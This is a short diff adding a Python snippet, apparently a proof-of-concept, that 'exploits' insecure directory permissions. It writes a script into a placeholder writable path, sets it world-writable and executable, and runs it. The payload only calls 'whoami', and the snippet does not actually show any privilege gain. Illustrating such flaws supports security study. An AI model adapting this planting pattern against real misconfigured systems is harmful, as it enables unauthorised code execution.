@@ -1,0 +1,18 @@
+```python
+import os
+import subprocess
+
+# Example payload to exploit the incorrect permissions
+# This assumes that the attacker has local access and can write to the insecure directory
+
+# Step 1: Create a malicious script
+malicious_script = '/path/to/insecure_directory/malicious_script.py'
+with open(malicious_script, 'w') as f:
+    f.write('import os; os.system("whoami")')
+
+# Step 2: Change permissions to make it executable
+os.chmod(malicious_script, 0o777)
+
+# Step 3: Execute the malicious script
+subprocess.run(['python', malicious_script])
+```
